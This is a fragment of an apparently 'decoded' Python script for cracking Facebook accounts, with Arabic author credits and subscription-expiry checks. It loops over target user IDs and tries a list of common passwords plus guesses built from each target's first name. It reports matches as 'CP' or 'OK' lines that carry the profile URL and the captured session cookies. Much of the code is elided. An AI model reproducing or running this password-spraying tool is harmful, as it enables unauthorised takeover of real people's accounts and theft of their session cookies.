...
an2 = datetime.datetime(2024, 3,25,0,00)
hours = (now.hour)
if an > an2 or an == an2:
 ...
 print('\033[1;31m @AA9_C الـــمـــطـــوࢪ  ')
 exit(0)
else: 
 print("\n                             اشتراكك صالح لمدة                            ")
 ...
 print('')
 print('𓏳'*60)
 print('\t\n\033[1;31m @AA9_C الـــمـــطـــوࢪ   ')
 kilwa = '''''''''''print('𓏳'*50)'''''''''''
 
 time.sleep(5)
 os.system('clear')

#DECODED BY H A I D E R | @AA9_C
...
g= datetime.datetime(2024, 12, 19, 00, 00 ,00)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @D_E_M_O ☄️🗿')
    print('\n\n')
    print(x)
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append('00009999')
					pwv.append('SS123456')
					pwv.append('٨٢٩٣٧١٤٥٦')
					pwv.append('829371456')
					pwv.append('poiuytrewq')
					pwv.append('poiupoiu')
					pwv.append('9638521470')
					pwv.append('poiuytrewq')
					pwv.append('mnb123')
					pwv.append('mnb١٢٣')
					pwv.append('Aa١٢٣٤٥٦')
					pwv.append('123450123450')
					pwv.append('1020304050')
					pwv.append(frs+'1100')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print ('\x1b[36m|CP.|')
				xda = f'\r{idf} |{pw} : https://www.facebook.com/profile.php?id={idf}'                                      
				print ('\x1b[36m――――――――――――――――――――――――')
				...
				raven_a = f'\r[[OK]] {idf}|{pw} | \n\n{kuki} : https://www.facebook.com/profile.php?id={idf}'
